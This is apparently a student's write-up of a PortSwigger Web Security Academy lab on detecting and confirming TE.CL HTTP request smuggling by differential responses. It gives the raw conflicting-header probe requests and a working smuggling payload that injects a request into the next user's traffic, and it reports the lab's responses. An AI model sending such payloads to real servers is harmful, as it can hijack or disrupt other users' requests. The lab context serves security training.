[LAB](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses)
[Explained](https://www.youtube.com/watch?v=QaouEvhHefk&list=PLGb2cDlBWRUX1_7RAIjRkZDYgAB3VbUSw&index=5&ab_channel=JarnoTimmermans)

# Detection

```HTTP
POST / HTTP/1.1
Host: 0a69001803897d838055679c005a007c.web-security-academy.net
Content-Length: 11
Transfer-Encoding: chunked

3
abc
X

```
![](../../../Attachments/Pasted%20image%2020250818175935.png)
![](../../../Attachments/Pasted%20image%2020250818175935.png)
Got Invalid Request, which indicates that frontend doesn't use Content-Length header, and "X" is an invalid chunk size:
![[Invalid Chunk SIze.png]]


Confirming TE.CL with the second request from methodology
```
POST / HTTP/1.1
Host: 0a69001803897d838055679c005a007c.web-security-academy.net
Content-Length: 6
Transfer-Encoding: chunked

0

X
```
Got **Backend Timeout with 500 Internal Server Error**
![[Pasted image 20250818180347.png]]

# Usage of Differential Responses:

Explained:
![[Confirmation Diffential Responses TE CL.png]]

Crafting the request:
Adjusting the Content-Length of the smuggles request, to the minimum to append to the next request:
![[Pasted image 20250818183436.png]]

Adjusting the chunk size to correspond to the 404 request until its body (excluding last non-printable):
![[Pasted image 20250818184053.png]]
Adjusting first Content-Length to include only chunked size and following non-printable chars:
![[Pasted image 20250818184628.png]]

# Exploiting

```HTTP
POST / HTTP/1.1
Host: 0a7700a1047a045e82821b9f0067000c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

9f
POST /404 HTTP/1.1
Host: 0a7700a1047a045e82821b9f0067000c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

x=1
0


```
Got the **200 OK** and immediately send the normal request which responded with a **404 Not Found**
